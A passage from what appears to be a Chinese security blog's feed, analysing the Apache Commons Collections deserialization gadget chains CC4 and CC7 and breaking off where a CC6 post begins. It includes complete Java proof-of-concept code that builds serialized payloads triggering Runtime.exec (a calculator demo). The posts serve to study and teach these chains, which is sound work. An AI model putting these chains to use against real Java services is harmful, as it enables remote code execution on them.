class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections4</span> <span class="variable">commonsCollections4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections4</span>();</span><br><span class="line">        commonsCollections4.serialize();</span><br><span class="line">        commonsCollections4.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 通过反射将comparator修改为前面的链子</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221011110805910.png" alt="image-20221011110805910"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections7利用链分析</title>
      <link href="/2022/11/10/CommonsCollections7/"/>
      <url>/2022/11/10/CommonsCollections7/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections7利用链分析"><a href="#CommonsCollections7利用链分析" class="headerlink" title="CommonsCollections7利用链分析"></a>CommonsCollections7利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>终于迎来最后一条链子<code>CommonsCollections7</code>，利用条件如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本未知限制</span><br></pre></td></tr></table></figure></p><p>先看<code>ysoserial</code>给出的利用链<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line"></span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure></p><p>可以看到从<code>LazyMap#get()</code>起后面的都是<code>CommonsCollections1</code>的内容，前面则是新知识点，也是一条寻找了其他能触发<code>LazyMap#get()</code>方法的链子</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>根据 gadget 先跟进<code>Hashtable#readObject()</code>方法源码<br><img src="images/image-20221011152526177.png" alt="image-20221011152526177"></p><p>其中<code>s</code>是我们传入的输入流，分别通过<code>readObject()</code>进行反序列化赋值给<code>key</code>以及<code>value</code>，接着调用<code>reconstitutionPut()</code>方法，继续跟进<br><img src="images/image-20221011152715640.png" alt="image-20221011152715640"></p><p>在<code>reconstitutionPut()</code>方法中，调用了<code>key.equals()</code>方法，这里我们知道<code>key</code>是可控的，根据调用链看，最终是调用了<code>AbstractMap#equals()</code>，我们继续跟进<code>AbstractMap</code>类的<code>equals()</code>方法<br><img src="images/image-20221011153118215.png" alt="image-20221011153118215"></p><p>可以看见最终调用了<code>m.get()</code>方法，也就是如果<code>m</code>可控，则可以完成调用<code>LazyMap#get()</code>方法触发命令执行。在这里，<code>m</code>由传进来的参数<code>o</code>控制，也就是最初的<code>key</code>。</p><p>我们回到原来的<code>Hashtable</code>类，既然在<code>readObject()</code>方法对输入流进行反序列化，那么我们就去看序列化的方法<code>writeObject()</code><br><img src="images/image-20221011153622433.png" alt="image-20221011153622433"></p><p>这里的<code>entryStack.key</code>和<code>entryStack.value</code>则是我们通过<code>put()</code>传入的<code>key</code>和<code>value</code>。因此我们如果<code>put()</code>方法中的<code>key</code>为<code>LazyMap</code>对象的话，最终<code>m</code>则是<code>LazyMap</code>对象。</p><p>这里还剩下一个问题，就是怎么调用到<code>AbstractMap#equals()</code>方法呢？</p><p>首先我们必须构造<code>key</code>为<code>LazyMap</code>对象，最后才能调用到<code>LazyMap#get()</code>。因此我们再回来看看<code>LazyMap</code>类<br><img src="images/image-20221011162909030.png" alt="image-20221011162909030"></p><p>搜索一遍并没有发现<code>LazyMap</code>类有<code>equals()</code>方法，但最后注意到<code>LazyMap</code>类继承于<code>AbstractMapDecorator</code>类，跟进<br><img src="images/image-20221011163120529.png" alt="image-20221011163120529"></p><p><code>AbstractMapDecorator</code>类含有<code>equals()</code>方法。根据前面的学习，我们会构造以下 payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br></pre></td></tr></table></figure><p>所以此时的<code>this.map</code>为<code>HashMap</code>类对象，因此接下来会进入<code>HashMap#equals()</code><br><img src="images/image-20221011163412678.png" alt="image-20221011163412678"></p><p>而<code>HashMap</code>又继承于<code>AbstractMap</code>类，因此最终会调用到<code>AbstractMap#equals()</code>方法，整条利用链就通了，妙哉。</p><p>最终 POC 为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections7</span> <span class="variable">commonsCollections7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections7</span>();</span><br><span class="line">        commonsCollections7.serialize();</span><br><span class="line">        commonsCollections7.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>POC 中有几个问题需要解答。</p><ul><li>为什么<code>Hashtable</code>需要 put 两次？</li></ul><p>在<code>Hashtable#reconstitutionPut()</code>方法中，第一次进入时<code>tab</code>内容为空，无法进入 for 循环，进而没法调用到<code>key.equals()</code>方法<br><img src="images/image-20221011164109290.png" alt="image-20221011164109290"></p><p>为了调用两次<code>reconstitutionPut()</code>方法，我们需要通过<code>put()</code>两次内容，使得<code>elements</code>的值为2，进而在 for 循环里运行两次<code>reconstitutionPut()</code>方法<br><img src="images/image-20221011164346546.png" alt="image-20221011164346546"></p><ul><li>为什么<code>lazyMap()</code>需要<code>yy</code>和<code>zZ</code>两个字符串？</li></ul><p>还是<code>reconstitutionPut()</code>方法，<code>e.hash == hash</code>会判断上一个<code>key</code>的<code>hash</code>是否与当前<code>key</code>的<code>hash</code>相等，只有相等才能进入下一步。<br><img src="images/image-20221011165323252.png" alt="image-20221011165323252"></p><p>而字符串<code>yy</code>和<code>zZ</code>经过<code>hashCode()</code>方法计算是相等的<br><img src="images/image-20221011170202472.png" alt="image-20221011170202472"></p><p>那么为什么这两个字符串会相等呢？因为是字符串，所以我们跟进<code>String#hashCode()</code>方法<br><img src="images/image-20221011171013521.png" alt="image-20221011171013521"></p><p>算法就这一句<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = 31 * h + val[i];</span><br></pre></td></tr></table></figure></p><p>首先第一个<code>y</code>的<code>ascii</code>值为 121，而第一个<code>z</code>的<code>ascii</code>值为 122，经过计算：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:  y-&gt;121 y-&gt; 121*31 + 121 = 3872</span><br><span class="line">b:  z-&gt;122 ？-&gt; 122*31 + ？  = 3872  -&gt; ? = 90</span><br></pre></td></tr></table></figure></p><p>所以要想<code>a</code>和<code>b</code>经过<code>hashCode()</code>方法计算相等，<code>b</code>的第二个元素就得比<code>a</code>小，结果为<code>Z</code>，<code>Z</code>的<code>ascii</code>值为 90</p><ul><li>为什么最后要<code>remove(&quot;yy&quot;)</code>？</li></ul><p>问题出在<code>AbstractMap#equals()</code>方法里，<code>size()</code>的值为 1，而<code>m.size()</code>的值为 2，所以我们需要<code>remove</code>掉一个使其相等。<br><img src="images/image-20221012102519876.png" alt="image-20221012102519876"></p><p>那么还剩一下问题，为什么是<code>lazyMap2.remove(&quot;yy&quot;);</code>？</p><p>在<code>Hashtable#put()</code>方法时也会调用一次<code>entry.key.equals(key)</code><br><img src="images/image-20221012103923937.png" alt="image-20221012103923937"></p><p>因此在<code>hashtable.put(lazyMap2, 2);</code>之后跟到<code>AbstractMap()#equals()</code>方法<br><img src="images/image-20221012104621160.png" alt="image-20221012104621160"></p><p>这里可以看到，传入<code>LazyMap#get(key)</code>中的 key 为<code>yy</code>，继续跟进<code>LazyMap#get()</code>方法<br><img src="images/image-20221012104834141.png" alt="image-20221012104834141"></p><p>最后因为<code>lazyMap2</code>中并没有<code>yy</code>这个<code>key</code>，因此会执行一个<code>map.put(&quot;yy&quot;,&quot;yy&quot;)</code>的操作添加，所以在 POC 中，我们最后要把<code>lazyMap2</code>的<code>yy</code>给删除掉。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections6利用链分析</title>
      <link href="/2022/11/10/CommonsCollections6/"/>
      <url>/2022/11/10/CommonsCollections6/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections6利用链分析"><a href="#CommonsCollections6利用链分析" class="headerlink" title="CommonsCollections6利用链分析"></a>CommonsCollections6利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>为什么跳过了<code>CommonsCollections2</code>先学习<code>CommonsCollections6</code>？</strong></p><p>前面学习的<code>CommonsCollections</code>和<code>CommonsCollections1</code>链，可以看到都受限于 JDK 版本，在<code>jdk8u71</code>之后就无法利用，原因则是前面已经提过的。</p><p>而为了实现在高版本 JDK 的环境下依然能利用的问题，<code>CommonsCollections6</code>这条链子应运而生。因此在学完<code>CommonsCollections1</code>后接着学习<code>CommonsCollections6</code>会比较系统。</p><p>该条利用链的利用条件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本暂无</span><br></pre></td></tr></table></figure><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先看一些 p 牛给出的简化利用链：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span 